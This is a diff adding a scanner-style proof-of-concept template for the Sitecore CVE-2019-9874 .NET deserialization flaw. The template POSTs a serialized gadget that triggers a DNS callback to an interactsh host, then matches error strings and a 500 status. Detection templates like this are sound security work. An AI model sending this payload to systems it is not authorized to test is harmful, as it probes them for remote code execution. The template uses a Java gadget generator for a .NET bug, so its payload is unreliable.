@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "验证 Sitecore Experience Platform 是否存在 .NET 反序列化漏洞（CVE-2019-9874）。通过向 /sitecore/shell/Applications/Security/CreateNewUser/CreateNewUser.aspx 发送带有恶意序列化对象的 POST 请求，检测响应中是否出现反序列化错误信息。"
+id = "POC-AVE-2019-1685"
+name = "Sitecore Experience Platform 反序列化远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-1685"]
+vuln_id = [
+    "CVE-2019-9874",
+    "AVE-2019-1685",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/sitecore/shell/Applications/Security/CreateNewUser/CreateNewUser.aspx"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+__CSRFCOOKIE=test123;
+
+__CSRFTOKEN={{generate_java_gadget("dns", "https://{{interactsh-url}}", "base64")}}"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "PotentialCsrfException",
+    "deserialization",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [500]
+type = "status"
